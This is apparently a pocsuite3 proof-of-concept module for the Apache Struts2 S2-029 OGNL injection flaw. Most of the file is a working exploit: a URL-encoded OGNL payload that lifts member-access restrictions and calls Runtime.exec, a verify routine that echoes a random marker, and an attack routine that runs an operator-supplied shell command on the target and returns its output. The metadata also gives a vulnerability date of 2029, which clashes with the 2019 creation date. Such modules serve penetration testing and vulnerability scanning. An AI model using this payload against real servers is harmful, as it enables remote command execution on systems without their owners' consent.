from collections import OrderedDict
from urllib.parse import quote

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests
from pocsuite3.lib.core.enums import VUL_TYPE
from pocsuite3.lib.core.interpreter_option import OptString
from pocsuite3.lib.utils import random_str, get_middle_text


class DemoPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['knownsec.com']
    vulDate = '2029-5-8'
    createDate = '2019-5-8'
    updateDate = '2019-5-8'
    references = ['https://cwiki.apache.org/confluence/display/WW/S2-029']
    name = 'Apache Struts2 s2-029'
    appPowerLink = ''
    appName = 'Apache Struts2'
    appVersion = 'Struts 2.0.0 - Struts 2.3.24.1 (except 2.3.20.3)'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''S2-029:影响版本Struts 2.0.0-2.3.24.1(除了2.3.20.3); '''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    dockerfile = '''FROM isxiangyang/struts2-all-vul-pocsuite:latest'''

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString('', description="可执行的shell命令")
        return o

    def _verify(self):
        p = self._check()
        if p:
            return self.parse_output(p)

    def _check(self):
        result = {}
        exec_payload = "?message=(%23_memberAccess%5B'allowPrivateAccess'%5D=true,%23_memberAccess%5B'allowProtectedAccess'%5D=true,%23_memberAccess%5B'excludedPackageNamePatterns'%5D=%23_memberAccess%5B'acceptProperties'%5D,%23_memberAccess%5B'excludedClasses'%5D=%23_memberAccess%5B'acceptProperties'%5D,%23_memberAccess%5B'allowPackageProtectedAccess'%5D=true,%23_memberAccess%5B'allowStaticMethodAccess'%5D=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('{cmd}').getInputStream()))"

        hash_md5 = random_str(5)
        cmd = "echo {};".format(hash_md5)
        html = requests.get(
            self.url + "{payload}".format(payload=exec_payload.format(cmd=quote(cmd)))).text
        if hash_md5 in html:
            result["VerifyInfo"] = {
                "URL": self.url,
            }
            return result
        return False

    def _attack(self):
        result = {}
        p = self._check()
        if p:
            exec_payload = "?message=(%23_memberAccess%5B'allowPrivateAccess'%5D=true,%23_memberAccess%5B'allowProtectedAccess'%5D=true,%23_memberAccess%5B'excludedPackageNamePatterns'%5D=%23_memberAccess%5B'acceptProperties'%5D,%23_memberAccess%5B'excludedClasses'%5D=%23_memberAccess%5B'acceptProperties'%5D,%23_memberAccess%5B'allowPackageProtectedAccess'%5D=true,%23_memberAccess%5B'allowStaticMethodAccess'%5D=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('{cmd}').getInputStream()))"
            cmd = self.get_option("command")
            cmd = "{}".format(cmd)
            html = requests.get(
                self.url + "{payload}".format(payload=exec_payload.format(cmd=quote(cmd)))).text
            result_cmd = get_middle_text(html, "value=\"", "\"")
            if html:
                result["VerifyInfo"] = {
                    "URL": self.url,
                    "result": result_cmd.replace("\x00", "").encode()
                }

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
